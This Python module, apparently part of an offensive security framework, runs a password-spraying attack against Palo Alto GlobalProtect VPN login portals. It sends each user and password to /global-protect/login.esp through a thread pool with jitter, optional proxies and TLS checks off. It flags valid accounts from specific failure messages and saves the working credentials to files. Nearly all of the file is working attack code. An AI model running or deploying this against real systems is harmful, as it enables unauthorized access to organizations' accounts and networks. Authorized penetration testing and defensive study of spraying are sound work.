#!/usr/bin/env python3

import json
import time
import logging
import urllib3
import asyncio
import requests
import concurrent.futures
import concurrent.futures.thread
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from functools import partial
from core.utils import *
from core.colors import text_colors
from core.defaults import *

class OmniModule(object):

    # Counter for successful results of each task
    successful_results = 0

    def __init__(self, *args, **kwargs):
        self.type     = "spray"
        self.args     = kwargs['args']
        self.loop     = kwargs['loop']
        self.out_dir  = kwargs['out_dir']
        self.executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=self.args.rate
        )
        self.proxies  = None if not self.args.proxy else {
            "http": self.args.proxy, "https": self.args.proxy
        }
        # Globally track users being sprayed so we can remove users
        # as needed
        self.users = []
        # Open file handles for logging and writing test/success cases
        self.log_file     = ThreadWriter(LOG_FILE, kwargs['log_dir'])
        self.tested_file  = ThreadWriter(SPRAY_TESTED, self.out_dir)
        self.success_file = ThreadWriter(SPRAY_FILE, self.out_dir)

    def shutdown(self, key=False):
        ''' Perform a shutdown and clean up of the asynchronous handler '''
        print()  # Print empty line
        if key:
            logging.warning("CTRL-C caught...")
        logging.info(f"Results can be found in: '{self.out_dir}'")

        # https://stackoverflow.com/a/48351410
        # https://gist.github.com/yeraydiazdiaz/b8c059c6dcfaf3255c65806de39175a7
        # Unregister _python_exit while using asyncio
        # Shutdown ThreadPoolExecutor and do not wait for current work
        import atexit
        atexit.unregister(concurrent.futures.thread._python_exit)
        self.executor.shutdown = lambda wait:None

        # Let the user know the number of valid credentials identified
        logging.info(f"Valid credentials: {self.successful_results}")

        # Close the open file handles
        self.log_file.close()
        self.tested_file.close()
        self.success_file.close()

    async def run(self, password):
        ''' Asyncronously execute task(s) '''
        blocking_tasks = [
            self.loop.run_in_executor(
                self.executor, partial(self._execute,
                                       user=user,
                                       password=password)
            )
            for user in self.users
        ]
        if blocking_tasks:
            await asyncio.wait(blocking_tasks)

    def prechecks(self):

        # Validate the user provided a URL when required
        if not self.args.url and self.arg.proxy_url:
            logging.error("Missing module arguments: --url")
            return False

        return True

    def _execute(self, user, password):
        ''' Perform an asynchronous task '''
        try:
            # Task jitter
            self.args.pause()

            # Write the tested user in its original format with the password
            self.tested_file.write(f"{user}:{password}")

            if self.args.url:
                url = self.args.url

            # If the --proxy-url flag is specified, use that instead of the
            # specified URL to pass all traffic through.
            if self.args.proxy_url:
                url = self.args.proxy_url

            # If a non-standard URL or proxy-url, ensure the required path and
            # elements are properly appended if not present.
            if "/global-protect/login.esp" not in url:
                url  = url.rstrip('/') + "/global-protect/login.esp"

            # Define a custom set of headers
            custom_headers = HTTP_HEADERS
            custom_headers['Content-Type'] = "application/x-www-form-urlencoded"

            # If the --proxy-url flag is specified, and the user provided custom
            # headers via --proxy-headers, set them via the custom_headers
            if self.args.proxy_url and self.args.proxy_headers:
                for header in self.args.proxy_headers:
                    header = header.split(':')
                    custom_headers[header[0].strip()] = ':'.join(header[1:]).strip()

            # Build POST data, if applicable, based on direct or JSON objects.
            data  = f"action=getsoftware&user=" + user + "&passwd=" +  password + "&ok=Log+In"

            # Perform an HTTP request and collect the results.
            req_type    = requests.post
            response    = self._send_request(req_type,
                                             url,
                                             data=data,
                                             headers=custom_headers)

            # Write the raw data we are parsing to the logs
            self.log_file.write(response.content)

            # Perform analysis on the response body.
            r_body = response.text
            goodmsgs = ["Authentication failed: We&#x27;re sorry, access is not allowed because you are not enrolled.",
                        "Authentication failed: Your account does not have access to this application."]
            if any(s in r_body for s in goodmsgs):
                self.successful_results += 1
                self.success_file.write(f"{user}:{password}")
                self.users.remove(user)  # Stop spraying user if valid
                logging.info("%s:%s: VALID", user, password)
            elif "Authentication failed: User Authentication Failed" in r_body:
                logging.info("%s:%s: INVALID", user, password)
            else:
                logging.info("%s:%s: Unexpected response", user, password)

        except Exception as e:
            logging.debug(e)
            pass

    def _send_request(self, request, url, auth=None, data=None, json=None,
                      headers=HTTP_HEADERS, allow_redirects=False):
        ''' Template for HTTP Requests '''
        return request(url,
                       auth=auth,
                       data=data,
                       json=json,
                       headers=headers,
                       proxies=self.proxies,
                       timeout=self.args.timeout,
                       allow_redirects=allow_redirects,
                       verify=False)
